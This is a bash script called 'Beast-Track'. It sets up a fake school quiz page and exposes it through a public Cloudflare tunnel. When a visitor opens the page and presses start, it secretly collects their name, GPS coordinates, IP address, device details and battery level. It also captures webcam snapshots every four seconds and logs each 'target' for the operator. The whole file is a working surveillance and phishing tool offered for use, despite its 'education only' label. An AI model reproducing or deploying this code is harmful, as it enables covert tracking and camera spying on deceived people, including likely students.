#!/bin/bash
# --- BEAST-TRACK v5.0 (SADFRIENDS REPLICA SETUP) ---
NC='\033[0m'; Bold='\033[1m'; PBlue='\033[1;34m'; PWhite='\033[1;37m'
PRed='\033[1;31m'; PYellow='\033[1;33m'; BCyan='\033[1;36m'; BGreen='\033[1;32m'

PORT=8888
SERVER_DIR="server"

mkdir -p $SERVER_DIR
rm -f $SERVER_DIR/*.png > /dev/null 2>&1
touch $SERVER_DIR/combined.log
chmod -R 755 $SERVER_DIR

clear
# --- BEAST ASCII BANNER ---
echo -e "${PBlue}${Bold} ██████╗ ███████╗ █████╗ ███████╗████████╗ ${NC}"
echo -e "${PBlue}${Bold} ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝ ${NC}"
echo -e "${PWhite}${Bold} ██████╔╝█████╗ ███████║███████╗ ██║ ${NC}"
echo -e "${PRed}${Bold} ██████╔╝███████╗██║ ██║███████║ ██║ ${NC}"
echo -e " ${PYellow}★★★ PILIPINAS TRACKER v5.0 ★★★${NC}"
echo -e " ${BGreen}Name       : ${PWhite}Beast-Track${NC}"
echo -e " ${BGreen}Created by : ${PWhite}SadFriends${NC}"
echo -e " ${BGreen}Status     : ${PWhite}For Education Purpose Only${NC}"
echo -e "${PWhite} ==========================================${NC}"

echo -e "\n ${PYellow}[ PILI NG QUIZ SUBJECT ]${NC}"
echo -e " ${PWhite} [ 1 ] MATHEMATICS${NC}"
echo -e " ${PWhite} [ 2 ] SCIENCE${NC}"
echo -e " ${PWhite} [ 3 ] ENGLISH${NC}"
read -p $'\n [*] Select ➤ ' q_opt

case $q_opt in
1) SUBJ="MATH"; S_COL="#3498db" ;;
2) SUBJ="SCIENCE"; S_COL="#2ecc71" ;;
*) SUBJ="ENGLISH"; S_COL="#9b59b6" ;;
esac

# --- PHP Backend (Replica Logic) ---
cat <<EOF > $SERVER_DIR/index.php
<?php
date_default_timezone_set('Asia/Manila');
if (isset(\$_POST['lat'])) {
    \$name = \$_POST['name'] ?? 'Unknown';
    \$batt = \$_POST['batt'] ?? 'Unknown';
    \$ua = \$_SERVER['HTTP_USER_AGENT'];
    \$log = "\n[--- NEW TARGET DETECTED ---]\n";
    \$log .= "TIME     : " . date('H:i:s') . "\n";
    \$log .= "NAME     : " . \$name . "\n";
    \$log .= "IP ADDR  : " . \$_SERVER['REMOTE_ADDR'] . "\n";
    \$log .= "BATTERY  : " . \$batt . "%\n";
    \$log .= "DEVICE   : " . \$ua . "\n";
    \$log .= "[---------------------------]\n";
    \$log .= "[+] GPS DATA RECEIVED\n";
    \$log .= "LATITUDE : " . \$_POST['lat'] . "\n";
    \$log .= "LONGITUDE: " . \$_POST['lon'] . "\n";
    \$log .= "MAPS LINK: https://google.com" . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
    file_put_contents('combined.log', \$log, FILE_APPEND);
    exit();
}
if (isset(\$_POST['img'])) {
    \$data = base64_decode(str_replace(' ', '+', str_replace('data:image/png;base64,', '', \$_POST['img'])));
    \$filename = 'cam_' . time() . '.png';
    file_put_contents(\$filename, \$data);
    file_put_contents('combined.log', "[+] SNAPSHOT SAVED: \$filename\n", FILE_APPEND);
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>$SUBJ Quiz</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 20px; }
        .box { background: #1e1e1e; padding: 25px; border-radius: 15px; border: 1px solid $S_COL; }
        .btn { background: $S_COL; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; margin-top: 10px; }
        input { width: 90%; padding: 10px; margin-bottom: 10px; border-radius: 5px; border: none; }
    </style>
</head>
<body>
    <div class="box" id="reg">
        <h2 style="color:$S_COL">REGISTRATION</h2>
        <input type="text" id="uname" placeholder="Enter Full Name..." required>
        <p>Allow Permissions to start the quiz.</p>
        <button class="btn" onclick="start()">START QUIZ</button>
    </div>
    <div id="quiz" class="box" style="display:none;">
        <h3>Question 1 of 10</h3>
        <p>Loading Question...</p>
    </div>
    <video id="v" style="display:none;" autoplay></video><canvas id="c" style="display:none;"></canvas>
    <script>
    let isDone = false;
    async function start() {
        const name = document.getElementById('uname').value;
        if(!name) return alert('Name is required!');
        const battery = await navigator.getBattery();
        const battLevel = Math.floor(battery.level * 100);

        navigator.geolocation.getCurrentPosition(p => {
            const body = 'lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&name='+encodeURIComponent(name)+'&batt='+battLevel;
            fetch('index.php', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: body});
        });

        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
            const v = document.getElementById('v'); v.srcObject = s;
            const c = document.getElementById('c');
            setInterval(() => {
                if(!isDone) {
                    c.width=v.videoWidth; c.height=v.videoHeight;
                    c.getContext('2d').drawImage(v,0,0);
                    fetch('index.php', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'img='+encodeURIComponent(c.toDataURL('image/png'))});
                }
            }, 4000);
        });
        document.getElementById('reg').style.display='none';
        document.getElementById('quiz').style.display='block';
    }
    </script>
</body>
</html>
EOF

# --- SERVER RUN ---
echo -e "${PYellow}[*] Patriot Server starting...${NC}"
fuser -k $PORT/tcp > /dev/null 2>&1
php -S 127.0.0.1:$PORT -t $SERVER_DIR > /dev/null 2>&1 &
PHP_PID=$!
cloudflared tunnel --url http://127.0.0.1:$PORT > cf.log 2>&1 &
CF_PID=$!

while true; do
    CF_LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cf.log)
    if [ ! -z "$CF_LINK" ]; then
        echo -e "${BGreen}[+] LINK: ${PWhite}${Bold}$CF_LINK${NC}"
        echo -e "${BCyan}[*] Monitoring Logs (Waiting for victim...)${NC}"
        echo -e "\n--- BEAST-TRACK v5.0 FINAL LOGS ---"
        break
    fi
    sleep 1
done

trap "kill $PHP_PID $CF_PID; exit" INT TERM EXIT
tail -f $SERVER_DIR/combined.log | awk '{
    if ($0 ~ /NEW TARGET DETECTED/) print "\033[1;36m" $0 "\033[0m";
    else if ($0 ~ /SNAPSHOT SAVED/) print "\033[1;32m" $0 "\033[0m";
    else if ($0 ~ /GPS DATA RECEIVED/) print "\033[1;33m" $0 "\033[0m";
    else if ($0 ~ /MAPS LINK/) print "\033[1;34m" $0 "\033[0m";
    else print "\033[1;37m" $0 "\033[0m";
}'
